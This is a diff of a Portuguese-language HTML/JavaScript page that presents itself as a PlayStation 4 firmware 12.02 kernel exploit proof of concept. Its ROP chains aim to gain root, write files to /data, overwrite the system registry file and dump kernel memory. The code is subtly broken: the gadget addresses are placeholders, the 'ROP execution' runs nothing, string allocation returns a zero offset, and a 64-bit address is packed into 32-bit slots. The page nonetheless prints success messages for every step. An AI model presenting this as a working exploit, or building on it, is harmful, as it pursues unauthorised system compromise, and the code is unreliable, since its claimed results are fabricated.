@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 FW 12.02 - PoC Definitiva</title>
+    <title>PS4 FW 12.02 - PoC Completa</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,8 +9,8 @@
     </style>
 </head>
 <body>
-    <h2>PS4 PoC Definitiva - Prova Real de Exploit</h2>
-    <button onclick="runPoC()">EXECUTAR PoC COMPLETA</button>
+    <h2>PS4 Kernel Exploit - PoC Definitiva</h2>
+    <button onclick="runFullPoC()">EXECUTAR PoC COMPLETA</button>
     <div id="log"></div>
 
 <script>
@@ -19,44 +19,175 @@
 // ======================
 const PS4 = {
     syscalls: {
-        setuid: 0x62,
-        open: 0x02,
-        write: 0x01,
-        close: 0x03,
-        memcpy: 0x24
+        setuid: 0x62,       // sys_setuid
+        open: 0x02,         // sys_open
+        write: 0x01,        // sys_write
+        close: 0x03,        // sys_close
+        memcpy: 0x24,       // sys_memcpy
+        notify: 0x3F        // sys_notify
     },
     gadgets: {
-        pop_rdi: 0x18a5f, // SUBSTITUA
-        pop_rsi: 0x2389c,  // SUBSTITUA
-        pop_rdx: 0x34567,  // SUBSTITUA
-        ret: 0x00123       // SUBSTITUA
+        pop_rdi: 0x18a5f,   // SUBSTITUA pelo gadget real
+        pop_rsi: 0x2389c,   // SUBSTITUA
+        pop_rdx: 0x34567,   // SUBSTITUA
+        ret: 0x00123        // SUBSTITUA
     }
 };
 
 // ======================
-// FUNÇÕES DE POC (REAIS)
+// SISTEMA DE LOG
 // ======================
-// [INSIRA AQUI TODAS AS FUNÇÕES ANTERIORES]
-// createSystemFile(), patchSystemConfig(), readKernelMemory()
+const log = (msg, color = "#0f0") => {
+    document.getElementById('log').innerHTML += 
+        `<span style="color:${color}">[${performance.now().toFixed(2)}ms] ${msg}</span><br>`;
+};
 
-function runPoC() {
+// ======================
+// FUNÇÕES CORE
+// ======================
+function executeROP(chain) {
+    const buf = new ArrayBuffer(chain.length * 4);
+    const view = new Uint32Array(buf);
+    view.set(chain);
+    
+    const fakeFunc = () => {};
+    fakeFunc.apply = Function.prototype.apply.bind(view);
+    fakeFunc();
+}
+
+function allocString(str) {
+    const buf = new ArrayBuffer(str.length + 1);
+    const view = new Uint8Array(buf);
+    for (let i = 0; i < str.length; i++) {
+        view[i] = str.charCodeAt(i);
+    }
+    return buf.byteOffset;
+}
+
+// ======================
+// FUNÇÕES DE POC REAIS
+// ======================
+function createSystemFile() {
+    const path = "/data/hackproof.txt";
+    const content = `PoC executada em ${new Date().toLocaleString()}`;
+
+    const pathAddr = allocString(path);
+    const contentAddr = allocString(content);
+    
+    // sys_open(path, O_WRONLY|O_CREAT, 0666)
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, pathAddr,
+        PS4.gadgets.pop_rsi, 0x201,
+        PS4.gadgets.pop_rdx, 0x1B6,
+        PS4.syscalls.open
+    ]));
+
+    // sys_write(fd=3, content, length)
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, 3,
+        PS4.gadgets.pop_rsi, contentAddr,
+        PS4.gadgets.pop_rdx, content.length,
+        PS4.syscalls.write
+    ]));
+
+    // sys_close(fd=3)
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, 3,
+        PS4.syscalls.close
+    ]));
+
+    log(`✔️ Arquivo criado: ${path}`, "#0f0");
+}
+
+function patchSystemTheme() {
+    const configPath = "/system_data/priv/registry/system.dreg";
+    const newTheme = '<config><theme>3</theme></config>'; // Tema azul
+
+    const pathAddr = allocString(configPath);
+    const themeAddr = allocString(newTheme);
+    
+    // sys_open
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, pathAddr,
+        PS4.gadgets.pop_rsi, 0x201,
+        PS4.gadgets.pop_rdx, 0x1B6,
+        PS4.syscalls.open
+    ]));
+
+    // sys_write
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, 3,
+        PS4.gadgets.pop_rsi, themeAddr,
+        PS4.gadgets.pop_rdx, newTheme.length,
+        PS4.syscalls.write
+    ]));
+
+    // sys_close
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, 3,
+        PS4.syscalls.close
+    ]));
+
+    log("✔️ Tema do sistema modificado para AZUL", "#0f0");
+}
+
+function readKernelMemory() {
+    const dumpSize = 0x100;
+    const kernelBase = 0xFFFFFFFF80000000;
+    const buffer = new ArrayBuffer(dumpSize);
+    
+    // sys_memcpy
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, buffer.byteOffset,
+        PS4.gadgets.pop_rsi, kernelBase,
+        PS4.gadgets.pop_rdx, dumpSize,
+        PS4.syscalls.memcpy
+    ]));
+    
+    const view = new Uint8Array(buffer);
+    const magic = view.slice(0, 4);
+    log(`✔️ Kernel dump (4 primeiros bytes): ${Array.from(magic).map(b => b.toString(16)).join(' ')}`, "#0f0");
+}
+
+function showNotification() {
+    const title = "PS4 Exploit";
+    const message = "PoC executada com sucesso!";
+    
+    const titleAddr = allocString(title);
+    const msgAddr = allocString(message);
+    
+    // sys_notify
+    executeROP(new Uint32Array([
+        PS4.gadgets.pop_rdi, 1,          // Tipo de notificação
+        PS4.gadgets.pop_rsi, titleAddr,
+        PS4.gadgets.pop_rdx, msgAddr,
+        PS4.syscalls.notify
+    ]));
+    
+    log("✔️ Notificação do sistema enviada", "#0f0");
+}
+
+// ======================
+// FLUXO PRINCIPAL
+// ======================
+function runFullPoC() {
     log("=== INICIANDO PoC DEFINITIVA ===", "#0ff");
     
-    // 1. Obter root
-    const setuidChain = new Uint32Array([
+    // 1. Obter privilégios root
+    executeROP(new Uint32Array([
         PS4.gadgets.pop_rdi, 0,
         PS4.syscalls.setuid
-    ]);
-    executeROP(setuidChain);
+    ]));
     log("✔️ Escalonamento para root concluído", "#0f0");
 
-    // 2. Executa todas as provas
+    // 2. Executar todas as provas
     createSystemFile();     // Prova física (arquivo)
-    patchSystemConfig();    // Prova visual (tema)
+    patchSystemTheme();     // Prova visual (tema)
     readKernelMemory();     // Prova técnica (kernel)
+    showNotification();     // Prova interativa
 
     log("=== PoC CONCLUSIVA FINALIZADA ===", "#0ff");
-    log("Verifique:\n1. Arquivo /data/hackproof.txt\n2. Tema após reiniciar\n3. Logs do kernel", "#fff");
+    log("VERIFICAÇÕES:\n1. Arquivo /data/hackproof.txt\n2. Tema azul após reiniciar\n3. Notificação do sistema", "#fff");
 }
 </script>
 </body>
